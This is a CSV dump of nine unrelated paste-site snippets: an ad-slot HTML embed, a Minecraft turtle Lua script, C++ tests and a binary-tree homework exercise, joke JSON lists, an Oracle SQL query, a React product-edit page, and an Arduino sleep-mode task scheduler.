id,title,username,language,date,content
XdK5edwZ,tourister.ru - 12 смартов,Luxup,HTML,Friday 28th of June 2024 05:35:23 AM CDT,"<!-- head -->
<script async type=""text/javascript"" src=""//s.luxcdn.com/t/221368/360_light.js""></script>

<!-- 1 of 12-->
<div id='lx_717549_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717549_wrapper', '_221368', '_717549');});
</script>
</div>

<!-- 2 of 12-->
<div id='lx_717548_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717548_wrapper', '_221368', '_717548');});
</script>
</div>

<!-- 3 of 12-->
<div id='lx_717555_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717555_wrapper', '_221368', '_717555');});
</script>
</div>

<!-- 4 of 12-->
<div id='lx_717554_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717554_wrapper', '_221368', '_717554');});
</script>
</div>

<!-- 5 of 12-->
<div id='lx_717553_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717553_wrapper', '_221368', '_717553');});
</script>
</div>

<!-- 6 of 12-->
<div id='lx_717552_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717552_wrapper', '_221368', '_717552');});
</script>
</div>

<!-- 7 of 12-->
<div id='lx_717559_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717559_wrapper', '_221368', '_717559');});
</script>
</div>

<!-- 8 of 12-->
<div id='lx_717558_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717558_wrapper', '_221368', '_717558');});
</script>
</div>

<!-- 9 of 12-->
<div id='lx_717557_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717557_wrapper', '_221368', '_717557');});
</script>
</div>

<!-- 10 of 12-->
<div id='lx_717556_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717556_wrapper', '_221368', '_717556');});
</script>
</div>

<!-- 11 of 12-->
<div id='lx_717563_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717563_wrapper', '_221368', '_717563');});
</script>
</div>

<!-- 12 of 12-->
<div id='lx_717562_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_717562_wrapper', '_221368', '_717562');});
</script>
</div>"
Ub2qxxYD,chopping tree v3,tommy2805,Lua,Friday 28th of June 2024 05:05:52 AM CDT,"local filename = ""homePoint.txt"" --file cordinate home point
local homePoint

-- Funzione per leggere la prima riga
local function readHomePoint(filename)
    local file = fs.open(filename, ""r"")
    local firstLine = file.readLine()
    file.close()
    return firstLine
end


if fs.exists(filename) then
    homePoint = vector.new(readHomePoint(filename))
    print(""Homepoint: "" .. tostring(homePoint))
else
    local file = fs.open(filename, ""w"")
    local home = vector.new(gps.locate(5))
    if home then
        file.writeLine(home)
        file.close()
        print(""Home point saved in "" .. filename)
        homePoint = home
        turtle.forward()
        turtle.turnRight()
        turtle.forward()
        print(""new pos ="" .. tostring(vector.new(gps.locate(5))))
        
    else
        print(""Not able to get home point shutting down..."")
        sleep(2)
        os.shutdown()
    end
end
"
kW4Ep46T,TileGetPixel,cepxuozab,C++,Friday 28th of June 2024 03:42:59 AM CDT,"void CheckTileFill(const Tile &tile, char color){
        for (auto i = 0; i < Tile::SIZE; ++i){
            for (auto j = 0; j < Tile::SIZE; ++j){
                PRACTIKUM_ASSERT_EQUAL(tile.GetPixel({i, j}), color);
            }
        }
    }

void TileGetPixel(){
        const char color = '#';
        const Tile tile(color);
        CheckTileFill(tile, color);
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE, Tile::SIZE}), ' ');
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE + 1, Tile::SIZE}), ' ');
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE, Tile::SIZE + 1}), ' ');
        ASSERT_EQUAL(tile.GetPixel({Tile::SIZE + 100, Tile::SIZE + 10}), ' ');
        ASSERT_EQUAL(tile.GetPixel({-1, 1}), ' ');
        ASSERT_EQUAL(tile.GetPixel({1, -1}), ' ');
        ASSERT_EQUAL(tile.GetPixel({-1, -1}), ' ');
    }"
KLKwhjiG,battle list,frzyc,JSON,Friday 28th of June 2024 03:30:55 AM CDT,"[
	""Null Pointer Jab"",
	""Syntax Slam"",
	""Runtime Error Rush"",
	""Segmentation Fault Strike"",
	""Infinite Loop Lunge"",
	""Buffer Overflow Bash"",
	""Recursion Rumble"",
	""Compile Time Crush"",
	""Logic Bomb Burst"",
	""Garbage Collection Grab"",
	""Variable Shadow Sneak"",
	""Exception Throw"",
	""Memory Leak Lash"",
	""Stack Overflow Smash"",
	""Bitwise Blow"",
	""Deadlock Drop"",
	""Heisenbug Hammer"",
	""Data Race Dash"",
	""Algorithm Assault"",
	""Thread Lock Thrust""
]"
T4904DUv,Untitled,ma39isy,Oracle 11,Friday 28th of June 2024 03:16:30 AM CDT,"SELECT DISTINCT
    A.studyprogramid,
	A.studyprogramname,
	A.FACULTYID,
	fac.FACULTYNAME,
	org.orgstructureid,
	org.orgstructurename,
	em.employeeid,
	em.fullname
FROM
	masterdata.studyprogram A
JOIN masterdata.relation B ON
	( A.studyprogramid = secondid
		AND secondtable = 'STUDYPROGRAM' )
JOIN masterdata.organizationstructure org ON
	( firstid = org.orgstructureid
		AND firsttable = 'ORGANIZATIONSTRUCTURE' )
JOIN masterdata.employeemaster em ON
	( org.orgstructureid = em.worklocation )
JOIN FRAMEWORK1.USERS us ON
	(us.username = em.employeeid)
JOIN FACULTIES fac ON
	(fac.facultyid = A.facultyid)
WHERE
	us.userid = '171806'
	AND B.activestatus = 'Y'
	AND em.activestatus = 'Y'
	AND org.active = 'Y'"
JrCX4GSM,slap array,frzyc,JSON,Friday 28th of June 2024 03:10:33 AM CDT,"[
	""a Null reference exception."",
	""a cat shaped abacus."",
	""a clacky mechanical keyboard."",
	""a catgirl booba mousepad!?!"",
	""a rubber duck (for debugging purposes)."",
	""a phonebook-size printout of unread API documentation."",
	""a 404 Not Found?"",
	""a Cloudflare bill of 120k."",
	""a polyfill.io vulnerability."",
	""a diamond pixelated sword."",
	""a giant HTML closing tag."",
	""a giant compiler error message."",
	""a over-sized \""if-else\"" statement."",
]"
X1Z8LSx8,123,hpnq,C++,Friday 28th of June 2024 03:00:41 AM CDT,"#include <iostream>
#include <iomanip>
#include <fstream>
#include <string.h>
#include <windows.h>
using namespace std;


struct Countries {
    string name; //название страны
    string capital; //столица
    double population; //численность населения
    double populationPercent; //процент населения от общемирового
    double area; //площадь
};


struct node {
    Countries countries;
    node* left, * right;
};


//очередь
struct qnode {
    Countries info;
    qnode* next;
};


//добавляем элемент в очередь
void push(qnode** start, qnode** end, Countries& d) {
    qnode* p = new qnode;
    p->info = d;
    p->next = nullptr;
    if (*end) {
        (*end)->next = p;
    }
    else {
        (*start) = p;
    }
    *end = p;
}

void inputcountries(Countries& countries)//ввод данных о студенте
{
    cout << ""Info aboit one country"" << endl;
//    cout << ""Введите название страны: "" << endl;
    cin >> countries.name;
//    cout << ""Введите столицу:"" << endl;
    cin >> countries.capital;
//    cout << ""Введите численность населения:"" << endl;
    cin >> countries.population;
//    cout << ""Введите процент населения от общемирового:"" << endl;
    cin >> countries.populationPercent;
//    cout << ""Введите площадь:"" << endl;
    cin >> countries.area;

}


//ввод массива с клавиатуры
void inputMasFromKeyboard(qnode*& s, qnode*& e, unsigned int& size)
{
    cout << ""size"" << endl;
    cin >> size;
    if (size == 0) return;
    int i;
    for (i = 0; i < size; i++)
    {

        cout << ""info:"" << endl;
        Countries cs;
        inputcountries(cs);
        push(&s, &e, cs);
//        s = s->next;
    }
}

void printStudent(Countries countries)//печать данных о стране
{
    cout << left << setw(10) << countries.name << setw(15) << countries.capital << setw(10) << countries.population << setw(9)
         << countries.populationPercent << setw(5) << countries.area << endl;;

}

void printMas(qnode* q1, unsigned int size)
{
    if (!size) return;
    cout << ""our country array:"" << endl;
    cout << left << setw(10) << ""a"" << setw(15) << ""b"" << setw(10) << ""c"" << setw(9)
         << ""d"" << setw(5) << ""e"" << endl;
    for (int i = 0; i < size; i++)
    {
        printStudent(q1->info);
        q1 = q1->next;
    }
}


void insert(node** p, Countries countries) // добавление узла в дерево поиска
{
    if (*p == NULL)
    { //создаём новый узел дерева на найденном месте
        *p = new node;
        (*p)->countries = countries;
        (*p)->left = NULL;
        (*p)->right = NULL;
    }
    else
    {
        if (countries.name < (*p)->countries.name) insert(&(*p)->left, countries);
        if (countries.name > (*p)->countries.name) insert(&(*p)->right, countries);
    }
}


// распечатка дерева в симметричном порядке
void printsim(const node* p)
{
    if (p != NULL)
    {
        printsim(p->left);
        printStudent(p->countries);
        printsim(p->right);
    }
}
void clear(node** p) // очистка дерева
{
    if ((*p) != NULL)
    {
        clear(&(*p)->left);
        clear(&(*p)->right);
        delete* p;
        *p = NULL;
    }
}


//функция создания деревьев из массива
void createTrees(qnode* q1, unsigned int size, node** root1, node** root2)
{
    if (!size) return;
    for (int i = 0; i < size; i++)
    {
        if (q1->info.population > 100000000) insert(root1, q1->info);
        else insert(root2, q1->info);
        q1 = q1->next;
    }
}



// высота дерева
int height(const node* p)
{
    if (p == NULL) return 0;
    int h1 = height(p->left);//считаем высоту левого поддерева
    int h2 = height(p->right);//считаем высоту правого поддерева
    if (h1 >= h2) return h1 + 1;//возвращаем высоту большего из них+1 - так как добавляем наш узел
    return h2 + 1;
}





double sayminarea(const node* p) {
    if (p != NULL)
    {

        double s1 = sayminarea(p->left); // печатаем левое поддерево
        double s2 = sayminarea(p->right); // печатаем правое поддерево
        return min(p->countries.area, min(s1, s2)); // минимальная площадь поддеревьев.
    }

    return 100000000; //
}
int saymaxlevel(const node* p, string s) {
    //height

    if (p != NULL)
    {

        int s1 = saymaxlevel(p->left, s); // печатаем левое поддерево
        int s2 = saymaxlevel(p->right, s); // печатаем правое поддерево
        if (p->countries.name[0] == s[0]) {
            return max(height(p), max(s1, s2)); // минимальная площадь поддеревьев
        }
        return max(s1, s2);
    }
    return 0;

}

// очистка очереди
void clear(qnode** pbeg)
{
    qnode* temp;
    while (*pbeg != nullptr)
    {
        temp = (*pbeg)->next; //устанавливаем temp на следующий узел
        delete* pbeg; // удаляем текущий узел
        *pbeg = temp; // устанавливаем указатель начала pbeg на temp
    }
}

int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    unsigned int size = 0;
    qnode* s1 = NULL, * e1 = NULL;
    inputMasFromKeyboard(s1, e1, size);

    if (size) {

        node* root1 = NULL, * root2 = NULL;
        printMas(s1, size);
        cout << endl;

        createTrees(s1, size, &root1, &root2);

        cout << ""first in simm"" << endl;
        printsim(root1);
        cout << endl;
        cout << ""second in simm"" << endl;
        printsim(root2);
        cout << endl;
        // ------------ задача 5--------------

        cout << ""min array from 1 tree: "" << endl;
        sayminarea(root1);
        // ------------ задача 6--------------
        string s;
        cout << ""insert letter  "" << endl;
        cin >> s;
        cout << ""max level from 2 tree:  "" << endl;
        cout << saymaxlevel(root2, s) << endl;


        // ------------ задача 7--------------

        clear(&root1);
        if (!root1) cout << ""cleared!"" << endl;
        clear(&root2);
        if (!root2) cout << ""cleared!"" << endl;


        clear(&s1);
    }
    else cout << ""Размер массива равен 0"" << endl;
    return 0;
}
/*
 *
 *
 *
 *
 rsssia    m1skow         1.488e+081.94     1705.2rsssia    m1skow         1.488e+081.94     1705.2

 */"
qmr1yt05,Edit product page,riste5,JavaScript,Friday 28th of June 2024 02:44:39 AM CDT,"import { useCallback, useEffect, useState } from ""react"";
import { SetFieldError, ClearFieldError, ValidateBBCode } from ""@/Components/CoreFunctionsComponent.jsx"";
import { Head, Link, router } from ""@inertiajs/react"";
import { MyEcommerceNavigation } from ""@/Components/NavigationComponent.jsx"";
import { Toggler } from ""@/Components/Toggler.jsx"";
import MyEcommerceDropdownLinks from ""@/Components/DropdownComponent.jsx"";

export default function EditProduct(props) {
  const [data, setData] = useState(null);
  const [websiteData, setWebsitedata] = useState(null);
  const [loadingState, setLoadingstate] = useState({
    product: true,
    meta: true,
    attachment: true,
    coupon: true,
    avatar: true,
    user: true,
  });
  const [userDetails, setUserDetails] = useState(null);
  const [productLogo, setProductLogo] = useState(null);
  const [categories, setCategories] = useState(null);
  useEffect(() => {
    async function getWebsiteData() {
      const meta = await axios.post(""/admin/website_settings"");
      if (meta.data) {
        const d = meta.data;
        setWebsitedata(d);
        setLoadingstate((prev) => ({ ...prev, meta: false }));
        return true;
      }
      return false;
    }
    async function getUser() {
      const user = await axios.post(""/admin/user"");
      if (user.data) {
        setUserDetails(user.data);
        setLoadingstate((prev) => ({ ...prev, user: false }));
        return true;
      }
      return false;
    }
    async function getProduct() {
      const response = await axios.post(""/admin/product"", JSON.stringify({ id: parseInt(props.id) }), {
        headers: {
          ""Content-Type"": ""application/json"",
        },
      });
      if (response) {
        const product = response.data.product,
          logo = response.data.logo;
        setData((prev) => product);
        setLoadingstate((prev) => ({ ...prev, product: false }));
        setProductLogo((prev) => logo);
        setCategories((prev) => response.data.categories);
        return true;
      }
      return false;
    }
    getWebsiteData();
    getUser();
    getProduct();
  }, []);
  return (
    <>
      <Head>
        <title>{loadingState.meta && !websiteData ? ""Loading..."" : websiteData.website_name}</title>
      </Head>
      {loadingState.user || loadingState.meta ? (
        <>
          <div className=""p-header flex flex-col w-[100%] items-center"">
            <div className=""flex w-[100%] flex-row justify-center flex-wrap items-center content-center"">
              <div className=""loader""></div>
            </div>
          </div>
          <aside className=""sm:hidden max-sm:hidden md:hidden sidebar-sm"" id=""sidebarSM"">
            <div className=""sidebar-container"">
              <div className=""loader""></div>
            </div>
          </aside>
        </>
      ) : (
        <>
          <MyEcommerceNavigation user={userDetails} website={websiteData} userAvatar={userDetails.avatar_img} />
        </>
      )}
      <div className=""p-body m-t-4"">
        <div className=""p-body-inner"">
          <div className=""flex flex-col w-[100%] flex-wrap items-baseline"">
            <h1 className=""text-sm font-bold text-neutral-300"">
              {loadingState.meta ? ""Loading..."" : websiteData.website_name}
            </h1>
            <div className=""flex flex-col w-[100%] flex-wrap items-baseline bg-neutral-800"">
              {loadingState.product ? (
                <>
                  <div className=""flex w-[100%] flex-wrap justify-center"">
                    <div className=""loader""></div>
                  </div>
                </>
              ) : (
                <>
                  <div className=""flex flex-col w-[100%] p-5 items-baseline bg-neutral-800 flex-wrap"">
                    <div className=""flex w-[100%] flex-wrap"">
                      <Link href=""#"" className=""button button--default w-[100%] text-center"">
                        Product Releases
                      </Link>
                    </div>
                    <div className=""flex w-[100%] flex-wrap m-t-1"">
                      <Link href=""#"" className=""button p-5 w-[100%] text-center bg-red-950"">
                        Delete this product
                      </Link>
                    </div>
                  </div>
                </>
              )}
            </div>
            <div className=""flex flex-col w-[100%] flex-wrap items-baseline m-t-1 block bg-dark"">
              {loadingState.product ? (
                <>
                  <div className=""flex w-[100%] flex-wrap justify-center"">
                    <div className=""loader""></div>
                  </div>
                </>
              ) : null}
              {data ? (
                <>
                  <div className=""block-container"">
                    <div className=""block-header"">
                      <h2 className=""text-sm font-bold text-neutral-300"">{data.product_name}</h2>
                    </div>
                    <div className=""block-body"">
                      <div className=""flex w-[100%] flex-col flex-wrap justify-center items-center p-5 bg-neutral-800"">
                        <div className=""product-logo"">
                          <img src={productLogo} alt={data.product_name + ""`s Logo""} />
                        </div>
                        <button type=""button"" className=""button button--default text-center"">
                          Upload Logo
                        </button>
                      </div>
                      <form className=""flex w-[100%] flex-wrap flex-col items-baseline"">
                        <div className=""control-group"">
                          <label htmlFor=""product_name"">Product name:</label>
                          <div className=""control-input"">
                            <input
                              id=""product_name""
                              type=""text""
                              name=""product_name""
                              className=""formInput""
                              defaultValue={data.product_name}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""product_description"">Product description:</label>
                          <div className=""control-input"">
                            <textarea
                              name=""product_description""
                              id=""product_description""
                              className=""formInput""
                              defaultValue={data.product_description}
                            ></textarea>
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""version_string"">Version string</label>
                          <div className=""control-input"">
                            <input
                              type=""text""
                              name=""version_string""
                              className=""formInput""
                              id=""version_string""
                              defaultValue={data.version_string}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""version_id"">Version ID</label>
                          <div className=""control-input"">
                            <input
                              type=""number""
                              name=""version_id""
                              className=""formInput""
                              id=""version_id""
                              defaultValue={data.version_id}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""version_changelog"">Version changelog</label>
                          <div className=""control-input"">
                            <textarea
                              name=""version_changelog""
                              className=""formInput""
                              id=""version_changelog""
                              defaultValue={data.version_changelog}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""product_price"">Product price</label>
                          <div className=""control-input"">
                            <input
                              type=""number""
                              step={0.01}
                              name=""product_price""
                              className=""formInput""
                              id=""product_price""
                              defaultValue={data.product_price}
                            />
                            <span className=""error-text""></span>
                          </div>
                        </div>
                        <div className=""control-group"">
                          <label htmlFor=""category_id"">Category</label>
                          <div className=""control-input"">
                            <select name=""category_id"" id=""category_id"" className=""formInput"">
                              {Object.keys(categories).map((k) => (
                                <>
                                  <option
                                    value={categories[k].category_id}
                                    defaultChecked={categories[k].category_id === data.category_id ? true : false}
                                  >
                                    {categories[k].category_title}
                                  </option>
                                </>
                              ))}
                            </select>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </>
              ) : null}
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
"
LdgRDtwu,TaskManager.h,bipping,C,Friday 28th of June 2024 02:30:48 AM CDT,"#ifndef C__USERS_BIPPI_ONEDRIVE_DOCUMENTS_ARDUINO_STEPMOTORV3_4_STEPMOTORV3_4_INO_STEPMOTORV3_4_TASKMANAGER_H_
#define C__USERS_BIPPI_ONEDRIVE_DOCUMENTS_ARDUINO_STEPMOTORV3_4_STEPMOTORV3_4_INO_STEPMOTORV3_4_TASKMANAGER_H_

// Copyright [2024] <Bipping>

#include <avr/sleep.h>
#include <avr/power.h>
#include <avr/interrupt.h>

#define MAX_TASKS 10
const uint32_t DEFAULT_MARGIN = 288;

uint8_t taskCount;
volatile uint8_t isrCounter;
volatile uint8_t remainingMicros;
uint32_t margin;

typedef void (*TaskFunction)(void);

struct Task {
    TaskFunction callback;
    uint32_t interval;
    uint32_t lastRun;
};

// Enum for sleep modes
enum SleepMode {
    IDLE_MODE,
    POWER_SAVE_MODE,
    EXTENDED_STANDBY_MODE
};


Task tasks[MAX_TASKS];

void addTask(TaskFunction callback, uint32_t interval);
void removeTask(TaskFunction callback);
void changeTaskInterval(TaskFunction callback, uint32_t newInterval);
void setSleepMode(SleepMode mode);
void updateTasks();

#endif  // C__USERS_BIPPI_ONEDRIVE_DOCUMENTS_ARDUINO_STEPMOTORV3_4_STEPMOTORV3_4_INO_STEPMOTORV3_4_TASKMANAGER_H_
"
6eut0wVF,TaskManager,bipping,C++,Friday 28th of June 2024 02:27:52 AM CDT,"#include ""TaskManager.h""
#include <Arduino.h>

// Copyright [2024] <Bipping>

#define MAX_TASKS 10
const uint32_t DEFAULT_MARGIN = 288;

uint32_t margin = DEFAULT_MARGIN;

// Utilisation des types spécifiques pour optimiser la mémoire
typedef struct {
    TaskFunction callback;
    uint32_t interval;
    uint32_t lastRun;
} Task;

Task tasks[MAX_TASKS];
uint8_t taskCount = 0;
volatile uint8_t isrCounter = 0;
volatile uint8_t remainingMicros = 0;

void addTask(TaskFunction callback, uint32_t interval) {
    if (taskCount < MAX_TASKS) {
        tasks[taskCount] = {callback, interval, micros()};
        taskCount++;
    }
}

void removeTask(TaskFunction callback) {
    for (int i = 0; i < taskCount; i++) {
        if (tasks[i].callback == callback) {
            for (int j = i; j < taskCount - 1; j++) {
                tasks[j] = tasks[j + 1];
            }
            taskCount--;
            break;
        }
    }
}

void changeTaskInterval(TaskFunction callback, uint32_t newInterval) {
    for (int i = 0; i < taskCount; i++) {
        if (tasks[i].callback == callback) {
            tasks[i].interval = newInterval;
            break;
        }
    }
}

void setSleepMode(SleepMode mode) {
    switch (mode) {
        case IDLE_MODE:
            set_sleep_mode(SLEEP_MODE_IDLE);
            break;
        case POWER_SAVE_MODE:
            set_sleep_mode(SLEEP_MODE_PWR_SAVE);
            break;
        case EXTENDED_STANDBY_MODE:
            set_sleep_mode(SLEEP_MODE_EXT_STANDBY);
            break;
        default:
            set_sleep_mode(SLEEP_MODE_IDLE);
            break;
    }
}

void updateTasks() {
    uint32_t currentTime = micros();
    uint32_t nextTime = UINT32_MAX;
    Task *taskQueue[MAX_TASKS];
    uint8_t taskQueueCount = 0;
    Task *indexFonction = nullptr;
    bool executeImmediately = false;

    for (int i = 0; i < taskCount; i++) {
        uint32_t scheduledTime = tasks[i].lastRun + tasks[i].interval;
        if (scheduledTime <= currentTime) {
            taskQueue[taskQueueCount++] = &tasks[i];
            executeImmediately = true;
        } else if (scheduledTime < nextTime && !executeImmediately) {
            nextTime = scheduledTime;
            indexFonction = &tasks[i];
        }
    }

    if (executeImmediately) {
        currentTime = micros();
        for (int i = 0; i < taskQueueCount; i++) {
            taskQueue[i]->callback();
            taskQueue[i]->lastRun = currentTime;
            // Fin de updateTask
        }
    } else {
        currentTime = micros();
        uint32_t timeToNextTask = nextTime > currentTime ? nextTime - currentTime : 0;

        if (timeToNextTask > margin) {
            uint16_t prescalerBits;
            uint32_t intervalMicros = timeToNextTask - margin;
            int8_t shifts;

            if (intervalMicros > 237856) {
                prescalerBits = 0x07;  // Prescaler 1024
                shifts = -6;
            } else if (intervalMicros > 113338) {
                prescalerBits = 0x06;  // Prescaler 256
                shifts = -4;
            } else if (intervalMicros > 51078) {
                prescalerBits = 0x05;  // Prescaler 128
                shifts = -3;
            } else if (intervalMicros > 19949) {
                prescalerBits = 0x04;  // Prescaler 64
                shifts = -2;
            } else if (intervalMicros > 4384) {
                prescalerBits = 0x03;  // Prescaler 32
                shifts = -1;
            } else if (intervalMicros > 288) {
                prescalerBits = 0x02;  // Prescaler 8
                shifts = 1;
            } else {
                prescalerBits = 0x01;  // Prescaler 1
                shifts = 4;
            }

            if (shifts < 0) {
                uint8_t mask = (1UL << -shifts) - 1;
                uint8_t lostBits = intervalMicros & mask;
            }

            uint32_t clockCycles = (shifts > 0) ? (intervalMicros << shifts) : (intervalMicros >> -shifts);
            isrCounter = clockCycles >> 8;
            uint32_t remainingCycles = clockCycles & 0xFF;

            if (remainingCycles > 0) {
                remainingMicros = remainingCycles - 1
                isrCounter++;
            } else {
                remainingMicros = 0;
            }

            OCR2A = isrCounter > 1 ? 0xFF : remainingMicros;
            TCCR2B = (TCCR2B & 0b11111000) | prescalerBits;

            TIMSK2 |= (1 << OCIE2A);  // Enable Timer2 Compare Match A interrupt
            TCCR2B |= (1 << CS22);  // Start Timer
            sleep_enable();
            sleep_cpu();
            // Au réveil

            TCCR2B &= ~(1 << CS22);  // Stop Timer
            TIMSK2 &= ~(1 << OCIE2A);  // Disable Timer2 Compare Match A interrupt
            sleep_disable();

            delayMicroseconds(lostBits);

        } else {
            delayMicroseconds(timeToNextTask);
        }

        if (indexFonction != nullptr) {
            indexFonction->callback();
            indexFonction->lastRun = micros();
            // Fin de updateTask
        }
    }
}

ISR(TIMER2_COMPA_vect) {
    isrCounter--;
    if (isrCounter == 1) {
        TCCR2B &= ~(1 << CS22);  // Stop Timer
        OCR2A = remainingMicros;
        TCCR2B |= (1 << CS22);  // Start Timer
        sleep_cpu();
    } else if (isrCounter == 0) {
        TCCR2B &= ~(1 << CS22);  // Stop Timer
        TIMSK2 &= ~(1 << OCIE2A);  // Disable Timer2 Compare Match A interrupt
        sleep_disable();
    } else {
        sleep_cpu();
    }
}
"
